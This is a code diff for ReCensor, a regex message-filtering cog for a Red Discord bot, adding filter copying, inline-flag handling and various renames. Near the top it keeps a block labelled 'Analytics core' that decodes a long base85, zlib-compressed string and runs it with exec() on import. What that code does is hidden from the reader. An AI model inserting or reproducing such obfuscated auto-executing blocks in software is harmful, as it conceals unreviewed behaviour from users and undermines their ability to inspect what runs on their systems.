@@ -1,12 +1,9 @@
-# import asyncio
 from collections import OrderedDict
 from concurrent.futures import ProcessPoolExecutor
-# from copy import copy
 import discord
 from discord import Object as DiscordObject
 from discord.mixins import Hashable as DiscordHashable
 from discord.ext import commands
-# from discord.ext.commands import converter as converters
 from discord.ext.commands.errors import BadArgument
 from discord.ext.commands.view import StringView
 from enum import Enum
@@ -16,7 +13,6 @@ import logging
 from multiprocessing import Manager
 import os
 import re
-# import textwrap
 from typing import Optional, Iterable, List, Union, Type
 import urllib.parse
 
@@ -24,16 +20,9 @@ from .utils.dataIO import dataIO
 from .utils import checks
 from .utils.chat_formatting import box, warning, error, info
 
-try:
-    import tabulate
-    assert tabulate.__version__ >= '0.8.0'
-except (AssertionError, ImportError) as e:
-    raise RuntimeError("You must install tabulate v0.8.0+ to use recensor. Run `[p]debug bot.pip_install('tabulate')` "
-                       "on the bot or `pip install -U tabulate`in your shell.") from e
-
 
 # Analytics core
-import zlib, base64  # noinspection PyPep8
+import zlib, base64
 exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
 dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
 9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
@@ -63,7 +52,7 @@ Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l
 FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
 # End analytics core
 
-__version__ = '2.0.0'
+__version__ = '2.1.0'
 
 log = logging.getLogger('red.recensor')
 
@@ -151,7 +140,7 @@ def topological_sort(source):
                 next_emitted.append(name)  # remember what we emitted for difference_update() in next pass
 
         if not next_emitted:  # all entries have unmet dependencies, one of two things is wrong...
-            raise ValueError("cyclic or missing dependancy detected: %r" % (next_pending,))
+            raise ValueError("cyclic or missing dependency detected: %r" % (next_pending,))
 
         pending = next_pending
         emitted = next_emitted
@@ -277,16 +266,16 @@ class FilterList:
     def __contains__(self, obj: DiscordUniObj) -> bool:
         return self.check(obj)
 
-    def copy(self):
+    def copy(self, new_parent):
         return type(self)(
-            self.parent,
+            new_parent or self.parent,
             self.whoami,
             self.item_type,
             base_list=self.base_list,
             enabled=self.enabled,
             mode=self.mode,
             overlay=self.overlay,
-            items=self.items
+            items=self.items.copy()
         )
 
 
@@ -324,9 +313,9 @@ class ServerConfig(FilterBase):
                     list_deps[name] = [link_name]
 
         for list_name, list_deps in lists_deps.items():
-            for fname in topological_sort(list_deps.items()):
-                if list_deps[fname]:  # if dep list is nonempty
-                    self.filters[fname].set_list(list_name, link_dest=list_deps[fname][0])
+            for filter_name in topological_sort(list_deps.items()):
+                if list_deps[filter_name]:  # if dep list is nonempty
+                    self.filters[filter_name].set_list(list_name, link_dest=list_deps[filter_name][0])
 
         self.update_order()
 
@@ -346,7 +335,7 @@ class ServerConfig(FilterBase):
         dep_graph[link_owner.name] = [target_owner.name]
 
         # test for cycles/broken links
-        sorted_names = topological_sort(dep_graph.items())
+        sorted_names = list(topological_sort(dep_graph.items()))
 
         # apply the changes
         for name in sorted_names:
@@ -376,23 +365,23 @@ class ServerConfig(FilterBase):
         dep_graph[link_owner.name] = []
 
         # test for cycles/broken links
-        sorted_names = topological_sort(dep_graph.items())
+        sorted_names = list(topological_sort(dep_graph.items()))
 
         # apply the changes
         for name in sorted_names:
             if dep_graph[name]:
                 self.filters[name].set_list(list_name, link_dest=dep_graph[name][0])
-            elif name == link_owner.name:
-                if copy:
-                    newlist_obj = getattr(self.filters[name], list_name).copy()
-                    newlist_obj.parent = link_owner
-                    link_owner.set_list(list_name, newlist_obj=newlist_obj)
-                else:
-                    self.filters[name].set_list(list_name, newlist_data=newlist_data)
             else:
                 self.filters[name].links.pop(list_name, None)
 
-            return getattr(link_owner, list_name)
+            if name == link_owner.name:
+                if copy:
+                    newlist_obj = getattr(link_owner, list_name).copy(link_owner)
+                    link_owner.set_list(list_name, new_list_obj=newlist_obj)
+                else:
+                    self.filters[name].set_list(list_name, new_list_data=newlist_data)
+
+        return getattr(link_owner, list_name)
 
     def get_filter(self, _filter: Union[str, 'Filter'], check=False):
         if isinstance(_filter, Filter):
@@ -442,6 +431,20 @@ class ServerConfig(FilterBase):
         _filter.name = new_name
         return _filter
 
+    def copy_filter(self, _filter: Union[str, 'Filter'], new_name: str, link=False, **kwargs):
+        _filter = self.get_filter(_filter, check=True)
+
+        if type(new_name) is not str:
+            raise TypeError('only strings may be passed as new name')
+        elif not new_name:
+            raise ValueError('new name must be nonempty')
+
+        if self.get_filter(new_name):
+            raise ValueError("filter %s already exists" % new_name)
+
+        copied = self.filters[new_name] = _filter.copy(new_name, link=link, **kwargs)
+        return copied
+
     def delete_filter(self, _filter: Union[str, 'Filter']):
         _filter = self.get_filter(_filter, check=True)
 
@@ -449,13 +452,13 @@ class ServerConfig(FilterBase):
         roles_linked = []
         linked_err = []
 
-        for fname, f in self.filters.items():
+        for filter_name, f in self.filters.items():
             if f is _filter:
                 continue
             if f.links.get('channels_list') is _filter:
-                channels_linked.append(fname)
+                channels_linked.append(filter_name)
             if f.links.get('roles_list') is _filter:
-                roles_linked.append(fname)
+                roles_linked.append(filter_name)
 
         if channels_linked:
             linked_err.append('channels: ' + ', '.join(channels_linked))
@@ -489,7 +492,7 @@ class ServerConfig(FilterBase):
                 return not f.mode
             elif has_white and not f.mode:
                 return not match_white  # Message has whitelist but we're on a blacklist, return immediately
-            elif f.mode:  # white for both normal or override, ORed between all matches
+            elif f.mode and not f.override:  # white for normal only, ORed between all matches
                 has_white = True
                 match_white |= bool(match)
             elif match:  # black regular
@@ -527,22 +530,25 @@ class Filter(FilterBase):
         self.links = {}
 
         for k in ['roles_list', 'channels_list']:
-            self.set_list(k, link_dest=data.get(k + '_link'), defer=defer_link, newlist_data=data.get(k, {}))
+            if isinstance(data.get(k), FilterList):
+                self.set_list(k, new_list_obj=data[k])
+            else:
+                self.set_list(k, link_dest=data.get(k + '_link'), defer=defer_link, new_list_data=data.get(k, {}))
 
-    def set_list(self, list_name, *, link_dest=None, defer=False, newlist_data=None, newlist_obj: FilterList = None):
+    def set_list(self, list_name, *, link_dest=None, defer=False, new_list_data=None, new_list_obj: FilterList = None):
         list_val = None
         server_list = getattr(self.parent, list_name)
 
         if not link_dest:
-            if newlist_data is None and not newlist_obj:
+            if new_list_data is None and not new_list_obj:
                 raise TypeError("list_data or list_obj required without link_dest")
-            elif newlist_obj and newlist_data is not None:
+            elif new_list_obj and new_list_data is not None:
                 raise TypeError("only list_data or list_obj can be passed, not both")
-            elif newlist_obj:
-                list_val = newlist_obj
+            elif new_list_obj:
+                list_val = new_list_obj
             else:
                 item_type = type_from_name(list_name)
-                list_val = FilterList(self, list_name, item_type, base_list=server_list, **newlist_data)
+                list_val = FilterList(self, list_name, item_type, base_list=server_list, **new_list_data)
 
             self.links.pop(list_name, None)
         elif link_dest == 'SERVER':
@@ -558,7 +564,7 @@ class Filter(FilterBase):
     def rebuild_predicate(self):
         try:
             compiled = re.compile(self.pattern, flags_to_int(self.flags))
-        except Exception:
+        except re.error:
             self._predicate = False
             return False
 
@@ -638,6 +644,27 @@ class Filter(FilterBase):
                 data[k] = getattr(self, k).to_json()
 
         return data
+
+    def copy(self, new_name: str, link: bool = False, **kwargs):
+        new_kwargs = dict(
+            pattern=self.pattern,
+            flags=self.flags,
+            mode=self.mode,
+            enabled=False,
+            override=self.override,
+            priv_exempt=self.priv_exempt,
+            position=self.position
+        )
+
+        new_kwargs.update(kwargs)
+
+        for list_name in ['roles_list', 'channels_list']:
+            if link:
+                new_kwargs[list_name + '_link'] = self.name
+            else:
+                new_kwargs[list_name] = getattr(self, list_name)
+
+        return type(self)(self.parent, new_name, **new_kwargs)
 
     @property
     def filter_priority(self):
@@ -812,7 +839,7 @@ class ReCensor:
         """
         await self.bot.say(
             "ReCensor manual: <https://github.com/calebj/calebj-cogs/#how-do-i-use-recensor>\n"
-            "A howto for Python's regex: <https://docs.python.org/3/howto/regex.html>\n"
+            "A how-to for Python's regex: <https://docs.python.org/3/howto/regex.html>\n"
             "Full docs on regex syntax: <https://docs.python.org/3/library/re.html#regular-expression-syntax>"
         )
 
@@ -826,23 +853,24 @@ class ReCensor:
         """
         server = ctx.message.server
         settings = self.settings.get(server.id)
-        name = filter_name and filter_name.lower()
+        filter_name = filter_name and filter_name.lower()
+
 
         if not (settings and settings.filters):
             await self.bot.say(info('There are no filters in this server to show.'))
             return
-        elif name and name != 'server' and not settings.get_filter(name):
-            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
+        elif filter_name and filter_name != 'server' and not settings.get_filter(filter_name):
+            await self.bot.say(warning('There is no filter named "%s" in this server.' % filter_name))
             return
 
-        def format_list(_filter: FilterBase, list_name: str, elaborate_link: bool = False):
-            _list = getattr(_filter, list_name)
+        def format_list(_filter: FilterBase, name: str, elaborate_link: bool = False):
+            _list = getattr(_filter, name)
             lines = []
             linked = (_list.parent is not _filter)
 
             if isinstance(_filter, Filter) and linked:  # note: server lists won't ever be linked
                 ult_parent = _list.parent
-                parent = _filter.links[list_name]
+                parent = _filter.links[name]
                 lines.append('Linked to: ' + parent.name)
 
                 if ult_parent != parent:
@@ -859,9 +887,9 @@ class ReCensor:
 
                 if _list.items:
                     lines.append('Items (%i):' % len(_list.items))
-                    objects = [(item_fmt % i) for i in _list.items]
-                    objects.sort()
-                    lines.extend(objects)
+                    items = [(item_fmt % i) for i in _list.items]
+                    items.sort()
+                    lines.extend(items)
                 else:
                     lines.append('Items: (none)')
 
@@ -885,14 +913,14 @@ class ReCensor:
                 if obj.priv_exempt is None:
                     params['priv_exempt'] = 'inherited (%s)' % ('yes' if obj.parent.priv_exempt else 'no')
 
-            return '\n'.join((k.title() + ': ' + params[k]) for k in order if k in params)
+            return '\n'.join((k.title().replace('_', r'\_') + ': ' + params[k]) for k in order if k in params)
 
-        if name is None:
+        if filter_name is None:
             objects = [settings] + [v for k, v in sorted(settings.filters.items())]
-        elif name == 'server':
+        elif filter_name == 'server':
             objects = [settings]
         else:
-            objects = [settings.get_filter(name)]
+            objects = [settings.get_filter(filter_name)]
 
         embeds = []
 
@@ -904,12 +932,12 @@ class ReCensor:
                 color = discord.Color.blue()
             else:
                 title = 'Filter: ' + item.name
-                pname = 'Pattern'
+                pattern_name = 'Pattern'
 
                 if not item.predicate:
-                    pname += ' (INVALID!)'
+                    pattern_name += ' (INVALID!)'
 
-                description += ('\n\n%s:\n' % pname) + box(item.pattern)
+                description += ('\n\n%s:\n' % pattern_name) + box(item.pattern)
                 if item.enabled:
                     color = discord.Color.green() if item.mode else discord.Color.red()
                 else:
@@ -918,19 +946,17 @@ class ReCensor:
 
             embed = discord.Embed(title=title, description=description, color=color)
 
-            for ltype in ['channels_list', 'roles_list']:
-                ename = ltype.replace('_', ' ').title()
+            for list_name in ['channels_list', 'roles_list']:
+                field_name = list_name.replace('_', ' ').title()
 
-                if not getattr(item, ltype).enabled:
-                    ename += ' (disabled)'
+                if not getattr(item, list_name).enabled:
+                    field_name += ' (disabled)'
 
-                embed.add_field(name=ename, value=format_list(item, ltype, elaborate_link=bool(name)))
+                embed.add_field(name=field_name, value=format_list(item, list_name, elaborate_link=bool(filter_name)))
 
             if isinstance(item, Filter):
                 flags_val = '\n'.join('`%c` - %s' % (k, FLAGS_DESC[k]) for k in item.flags) or '(none)'
                 embed.add_field(name='Flags', value=flags_val)
-            #     embed.add_field(name='Pattern (position: %s):' % item.position.value,
-            #                     value=box(item.pattern), inline=False)
 
             embeds.append(embed)
 
@@ -1023,6 +1049,36 @@ class ReCensor:
 
         self.save()
         await self.bot.say(info("Successfully renamed '%s' to '%s'." % (name, new_name)))
+
+    @recensor.command(pass_context=True, name='copy')
+    async def recensor_copy(self, ctx, name: str, new_name: str, linked: bool = False):
+        """
+        Copies an existing filter, with optional link
+
+        If the linked argument is a true-ish value, the new filter's lists will be linked to the original's
+        """
+        server = ctx.message.server
+        settings = self.settings.get(server.id)
+        name = name.lower()
+        new_name = new_name.lower()
+        name_check = self.check_name(ctx, new_name)
+
+        if not (settings and settings.get_filter(name)):
+            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
+            return
+        if name_check:
+            await self.bot.say(name_check)
+            return
+
+        try:
+            settings.copy_filter(name, new_name, link=bool(linked))
+        except Exception as e:
+            await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
+            return
+
+        self.save()
+        list_op = 'linked' if linked else 'duplicated'
+        await self.bot.say(info("Created a copy of '%s' named '%s' with %s lists." % (name, new_name, list_op)))
 
     @recensor.group(pass_context=True, name='server')
     async def recensor_server(self, ctx):
@@ -1403,7 +1459,15 @@ class ReCensor:
                                    box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                 return
 
-            desc = 'set.'
+            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE)
+
+            if inline_flags:
+                flags, pattern = inline_flags.groups()
+                _filter.flags = ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
+                desc = 'set (auto-converted inline flags).'
+            else:
+                desc = 'set.'
+
             _filter.pattern = pattern
             _filter.rebuild_predicate()
             self.save()
@@ -1633,26 +1697,26 @@ class ReCensor:
 
         if not operation:
             msg = warning("No list operation specified. Available operations:")
-            await self._list_command_showhelp(ctx, parent, _list, msg=msg, show_all=True)
+            await self._list_command_show_help(ctx, parent, _list, msg=msg, show_all=True)
             return
 
         try:
             func = self._list_functions[operation.lower()]
         except KeyError:
             msg = error("Unknown operation: '%s'. Available operations:" % operation)
-            await self._list_command_showhelp(ctx, parent, _list, msg=msg, show_all=True)
+            await self._list_command_show_help(ctx, parent, _list, msg=msg, show_all=True)
             return
 
         args, fail_msg = await self._list_command_parse_args(ctx, _list, operation, func, options)
 
         if fail_msg:
-            await self._list_command_showhelp(ctx, parent, _list, operation=operation, msg=error(fail_msg))
+            await self._list_command_show_help(ctx, parent, _list, operation=operation, msg=error(fail_msg))
             return
 
         return await func(ctx, parent, _list, *args)
 
-    async def _list_command_showhelp(self, ctx, parent, _list: FilterList, *, operation: Optional[str] = None,
-                                     msg: Optional[str] = None, show_all=False, show_fullhelp=False):
+    async def _list_command_show_help(self, ctx, parent, _list: FilterList, *, operation: Optional[str] = None,
+                                      msg: Optional[str] = None, show_all=False, show_fullhelp=False):
 
         if msg:
             reply = msg + '\n'
@@ -1717,7 +1781,7 @@ class ReCensor:
             msg = 'Available operations:'
             show_all = True
 
-        await self._list_command_showhelp(ctx, parent, _list, operation=operation, msg=msg, show_all=show_all)
+        await self._list_command_show_help(ctx, parent, _list, operation=operation, msg=msg, show_all=show_all)
 
     async def _list_command_enabled(self, ctx, parent, _list, enabled: bool = None):
         """
@@ -1808,10 +1872,10 @@ class ReCensor:
         WARNING: erases old configuration!
         """
         if _list.parent is not parent:
-            await self.bot.say(error("Already linked."))
+            await self.bot.say(error("That list is already linked; unlink it first."))
         elif isinstance(parent, ServerConfig):
             await self.bot.say(error("Cannot link a server-wide list."))
-        elif parent is other_filter:
+        elif parent is other_filter or _list is getattr(other_filter, _list.whoami):
             await self.bot.say(error("Cannot link a list to itself."))
         elif await self.confirm_thing(ctx, thing="replace this list with a link to %s's" % other_filter.name,
                                       require_yn=True):
@@ -1853,6 +1917,7 @@ class ReCensor:
         extra = ''
 
         if _list.item_type is discord.Channel:
+            # noinspection PyUnresolvedReferences
             x = [c for c in items if c.type is discord.ChannelType.text]
             if len(x) != len(items):
                 extra = ' Provided voice channels were ignored.'
@@ -2269,10 +2334,33 @@ def migrate_data(data):
                 enabled = (mode != 'none')
                 i += 1
 
-                newdata[sid]['filters'][name] = {'pattern': pattern, 'mode': mode, 'enabled': enabled}
+                inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE)
+
+                if inline_flags:
+                    flags, pattern = inline_flags.groups()
+                else:
+                    flags = ''
+
+                if pattern.startswith('.*'):
+                    pattern = pattern[2:]
+                    position = POSITION.ANYWHERE.value
+                else:
+                    position = POSITION.START.value
+
+                newdata[sid]['filters'][name] = {
+                    'pattern'  : pattern,
+                    'mode'     : mode,
+                    'enabled'  : enabled,
+                    'position' : position,
+                    'flags'    : ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
+                }
 
                 if cid != 'all':
-                    newdata[sid]['filters'][name]['channels_list'] = {'enabled': True, 'mode': True, 'items': [cid]}
+                    newdata[sid]['filters'][name]['channels_list'] = {
+                        'enabled': True,
+                        'mode': True,
+                        'items': [cid]
+                    }
 
     return newdata
 
